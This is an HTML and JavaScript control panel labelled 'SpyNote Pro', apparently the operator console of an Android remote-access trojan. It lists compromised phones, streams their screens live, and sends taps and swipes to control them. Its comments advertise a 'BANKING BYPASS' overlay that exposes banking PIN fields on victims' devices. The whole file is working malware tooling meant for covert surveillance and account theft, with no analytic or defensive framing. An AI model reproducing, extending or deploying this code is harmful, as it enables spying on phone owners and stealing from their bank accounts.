<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Pro - Live Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; z-index: 1000;
            background: rgba(15,15,35,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        .device { padding: 15px; margin: 10px 0; background: rgba(50,50,80,0.8); 
            cursor: pointer; border-radius: 12px; transition: all 0.3s; 
            border: 1px solid transparent; }
        .device:hover { background: rgba(70,70,120,0.9); border-color: #00ff88; transform: translateX(8px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc66) !important; 
            color: #000; border-color: #00ff88; box-shadow: 0 0 20px #00ff88; }
        .disconnected { opacity: 0.4; }

        #phone-frame {
            width: 420px; height: 850px; margin: 25px auto; 
            background: #111; border: 30px solid #222; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 25px 50px rgba(0,0,0,0.7); transition: all 0.3s;
        }
        #phone-frame.fullscreen { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            margin: 0; border: none; border-radius: 0; z-index: 999; }
        #screen-canvas { 
            width: 100%; height: 100%; background: #000; border-radius: 25px;
            image-rendering: crisp-edges; image-rendering: pixelated;
        }
        
        /* ‚úÖ UI ELEMENTS OVERLAY - BANKING BYPASS */
        #ui-overlay { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; border-radius: 25px; overflow: hidden;
        }
        .ui-element {
            position: absolute; background: rgba(0,255,136,0.3); 
            border: 2px solid rgba(0,255,136,0.7); border-radius: 6px;
            font-size: 12px; padding: 2px 4px; color: #000; font-weight: bold;
            backdrop-filter: blur(5px); pointer-events: auto; cursor: pointer;
            transition: all 0.2s; z-index: 10;
        }
        .ui-element:hover { background: rgba(0,255,136,0.6); transform: scale(1.05); }
        .ui-input { background: rgba(255,255,255,0.9) !important; color: #000; }

        #status-bar { position: fixed; top: 15px; right: 15px; z-index: 1000;
            background: rgba(15,15,35,0.95); padding: 15px 20px; border-radius: 12px;
            font-size: 14px; backdrop-filter: blur(20px); border: 1px solid #333; }
        #controls { position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 15px; z-index: 1000; }
        button {
            padding: 18px 35px; background: linear-gradient(45deg, #667eea, #764ba2); 
            color: white; border: none; border-radius: 30px; cursor: pointer; 
            font-size: 16px; font-weight: 600; transition: all 0.3s; min-width: 120px;
            box-shadow: 0 8px 25px rgba(102,126,234,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(102,126,234,0.6); }
        button:active { transform: translateY(0); }
        .danger { background: linear-gradient(45deg, #ff6b6b, #ee5a24); }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 15px; color: #00ff88;">üì± Live Devices</h3>
        <div id="device-list">Scanning...</div>
    </div>
    
    <div id="status-bar">
        <div>üîå Status: <span id="connectionStatus">Connecting...</span></div>
        <div>üì∫ FPS: <span id="fps">0</span> | üéÆ Device: <span id="selectedDevice">-</span></div>
        <div>üîç UI Elements: <span id="elementCount">0</span></div>
    </div>

    <div id="phone-frame">
        <canvas id="screen-canvas"></canvas>
        <div id="ui-overlay"></div>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button onclick="toggleScroll()">‚ÜïÔ∏è Scroll</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let lastFrameTime = 0, frameCount = 0;
        let scrollMode = false;
        let uiElements = [];

        const canvas = document.getElementById('screen-canvas');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const uiOverlay = document.getElementById('ui-overlay');
        const deviceList = document.getElementById('device-list');
        
        const statusEls = {
            connection: document.getElementById('connectionStatus'),
            fps: document.getElementById('fps'),
            device: document.getElementById('selectedDevice'),
            elements: document.getElementById('elementCount')
        };

        // ‚úÖ Socket Events
        socket.on('connect', () => {
            statusEls.connection.textContent = 'üü¢ LIVE';
            statusEls.connection.style.color = '#00ff88';
        });

        socket.on('devices-update', updateDeviceList);
        socket.on('screen-update', handleScreenUpdate);
        socket.on('ui-elements', handleUIElements); // ‚úÖ NEW: UI LAYOUT

        // Initial load
        fetch('/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)" title="${id}">
                        <b>${info.model?.slice(0,15) || id.slice(0,10)}</b><br>
                        <small>${info.brand || 'Android'} ${info.version || '?'}</small><br>
                        <span style="font-size:11px;">${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}</span>
                    </div>
                `).join('') : '<div style="opacity:0.5;">No devices online</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            statusEls.device.textContent = deviceId.slice(0,12) + '...';
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('select-device', { deviceId });
        }

        // üî• PERFECT SMOOTH SCREEN RENDERING
        function handleScreenUpdate(data) {
            if (data.deviceId !== currentDevice) return;
            
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            const img = new Image();
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                updateFPS();
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        }

        // ‚úÖ UI ELEMENTS OVERLAY - BANKING PIN FIELDS VISIBLE
        function handleUIElements(elements) {
            uiElements = elements;
            statusEls.elements.textContent = elements.length;
            renderUIElements();
        }

        function renderUIElements() {
            uiOverlay.innerHTML = '';
            uiElements.forEach((el, i) => {
                const div = document.createElement('div');
                div.className = `ui-element ${el.className || ''}`;
                div.textContent = el.text || el.contentDesc || `[${el.className}]`;
                div.style.left = `${(el.bounds.left / deviceWidth * 100)}%`;
                div.style.top = `${(el.bounds.top / deviceHeight * 100)}%`;
                div.style.width = `${((el.bounds.right - el.bounds.left) / deviceWidth * 100)}%`;
                div.style.height = `${((el.bounds.bottom - el.bounds.top) / deviceHeight * 100)}%`;
                
                if (el.isInput || el.className?.includes('EditText')) {
                    div.classList.add('ui-input');
                }
                
                div.onclick = () => sendTap(el.bounds.centerX, el.bounds.centerY);
                uiOverlay.appendChild(div);
            });
        }

        // Touch/Mouse Controls - PERFECT SCALING
        let startX = 0, startY = 0;
        function getDeviceCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: (clientX - rect.left) * (deviceWidth / rect.width),
                y: (clientY - rect.top) * (deviceHeight / rect.height)
            };
        }

        phoneFrame.addEventListener('click', e => {
            if (!currentDevice) return;
            const coords = getDeviceCoords(e.clientX, e.clientY);
            sendTap(coords.x, coords.y);
        });

        let dragStart = {x:0, y:0};
        phoneFrame.addEventListener('mousedown', e => {
            dragStart = getDeviceCoords(e.clientX, e.clientY);
        });

        phoneFrame.addEventListener('mousemove', e => {
            if (e.buttons === 1 && currentDevice) {
                const current = getDeviceCoords(e.clientX, e.clientY);
                sendSwipe(dragStart.x, dragStart.y, current.x, current.y);
            }
        });

        // Touch support
        phoneFrame.addEventListener('touchstart', e => {
            e.preventDefault();
            const touch = e.touches[0];
            dragStart = getDeviceCoords(touch.clientX, touch.clientY);
        }, { passive: false });

        phoneFrame.addEventListener('touchmove', e => {
            e.preventDefault();
            if (currentDevice && e.touches.length === 1) {
                const touch = e.touches[0];
                const current = getDeviceCoords(touch.clientX, touch.clientY);
                sendSwipe(dragStart.x, dragStart.y, current.x, current.y);
            }
        }, { passive: false });

        // Controls
        function sendTap(x, y) {
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            socket.emit('control', { 
                deviceId: currentDevice, action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function sendHome() {
            socket.emit('control', { deviceId: currentDevice, action: 'home' });
        }

        function toggleScroll() {
            scrollMode = !scrollMode;
            document.querySelector('button[onclick="toggleScroll()"]').textContent = 
                scrollMode ? '‚ÜïÔ∏è Scroll ON' : '‚ÜïÔ∏è Scroll';
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                phoneFrame.requestFullscreen();
                phoneFrame.classList.add('fullscreen');
            } else {
                document.exitFullscreen();
                phoneFrame.classList.remove('fullscreen');
            }
        }

        function updateFPS() {
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                statusEls.fps.textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                frameCount = 0;
                lastFrameTime = now;
            }
        }
    </script>
</body>
</html>
